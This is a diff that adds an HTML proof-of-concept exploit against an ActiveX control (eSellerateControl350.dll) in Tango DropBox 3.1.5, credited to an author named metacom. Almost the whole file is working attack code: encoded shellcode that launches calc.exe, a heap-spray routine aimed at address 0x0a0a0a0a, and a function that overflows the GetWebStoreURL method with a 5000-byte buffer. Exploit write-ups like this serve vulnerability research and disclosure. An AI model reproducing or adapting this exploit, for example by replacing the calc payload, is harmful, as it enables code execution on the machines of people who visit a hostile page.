@@ -1,0 +1,72 @@
+<HTML>
+<BODY>
+  <input language=JavaScript onclick=Tryme() type=button value="Launch Calc">
+  <object id=boom classid="clsid:{C915F573-4C11-4968-9080-29E611FDBE9F}"></object>
+<br>Tango DropBox Activex Heap Spray Exploit</br>
+<br>Version:3.1.5 + PRO</br>
+<br>The vulnerability lies in the COM component used eSellerateControl350.dll (3.6.5.0) method of the ''GetWebStoreURL' member.</br>
+<br>Vendor Homepage:http://etonica.com/dropbox/index.html</br>
+<br>Software Link:http://etonica.com/dropbox/download.html</br>
+<br>Author: metacom</br>
+<!--Video Poc:http://bit.ly/1K0hnYS -->
+<SCRIPT>
+
+var heapspray=unescape( "%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +
+                        "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +
+                        "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +
+                        "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +
+                        "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +
+                        "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +
+                        "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +
+                        "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +
+                        "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +
+                        "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +
+                        "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +
+                        "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +
+                        "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +
+                        "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +
+                        "%u652E%u6578%u9000");
+
+    	var sprayContainer = unescape("%u9090%u9090");
+  	var heapToAddress = 0x0a0a0a0a;
+
+
+    function Tryme()
+    {
+        var size_buff = 5000;
+        var x =  unescape("%0a%0a%0a%0a");
+        while (x.length<size_buff) x += x;
+        x = x.substring(0,size_buff);
+
+        boom.GetWebStoreURL(x, 1);
+    }
+    
+
+       function getsprayContainer(sprayContainer, sprayContainerSize)
+	{
+		while (sprayContainer.length*2<sprayContainerSize)
+		{
+			sprayContainer += sprayContainer;
+		}
+		sprayContainer = sprayContainer.substring(0,sprayContainerSize/2);
+		return (sprayContainer);
+	}
+
+        var heapBlockSize = 0x500000;
+        var SizeOfHeap = 0x30;
+    	var payLoadSize = (heapspray.length * 2);
+
+    	var sprayContainerSize = heapBlockSize - (payLoadSize + SizeOfHeap);
+    	var heapBlocks = (heapToAddress+heapBlockSize)/heapBlockSize;
+
+    	var memory = new Array();
+        sprayContainer = getsprayContainer(sprayContainer,sprayContainerSize);
+
+    	for (i=0;i<heapBlocks;i++)
+        {
+            memory[i] = sprayContainer +  heapspray;
+        }
+
+</SCRIPT>
+</BODY>
+</HTML>
